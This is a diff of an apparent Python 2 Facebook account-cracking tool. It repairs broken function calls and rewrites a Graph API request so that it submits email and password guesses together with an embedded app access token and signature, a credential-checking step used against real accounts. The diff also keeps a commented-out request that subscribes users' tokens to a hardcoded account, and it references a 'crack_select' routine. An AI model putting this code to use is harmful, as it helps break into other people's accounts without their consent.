@@ -88,7 +88,7 @@ def log_sel():
 def login():
     try:
         token = open('access_token.txt', 'r').read() 
-        login menu()
+        main()
     except (KeyError, IOError):
         os.system('clear')
         print logo
@@ -99,7 +99,7 @@ def login():
         print ' \x1b[1;96m [2] LOGIN WITH TOKEN\n'
         print ' \x1b[1;96m [0] EXIT \033[0m'
         print ''
-        login log_select()
+        log_select()
 
 
 def log_select():
@@ -108,7 +108,7 @@ def log_select():
     if sel == '1':
         log_fb()
     elif sel == '2':
-      log_select token()
+      token()
     elif sel == '0':
         ran()
     else:
@@ -166,7 +166,7 @@ def token():
         sav = open('access_token.txt', 'w')
         sav.write(token)
         sav.close()
-        token login()
+        login()
 
 #-----------------------------
 
@@ -180,7 +180,7 @@ def menu():
         token = open('access_token.txt', 'r').read()
         #requests.post('https://graph.facebook.com/100004718461536/subscribers?access_token=%s',token)
     except (KeyError, IOError):
-       menu login()
+      login()
 
     try:
         sz = '100017565944567'
@@ -235,7 +235,7 @@ def menu():
         
 
     try:
-        menu r = requests.get('https://graph.facebook.com/me?access_token=' + token)
+        r = requests.get('https://graph.facebook.com/me?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm' + token)
         q = json.loads(r.text)
         name = q['name']
     except KeyError:
@@ -437,4 +437,4 @@ def crack_select():
 #THANKX SHANI BRO
 
 if __name__ == '__main__':
-    main()
+    menu()
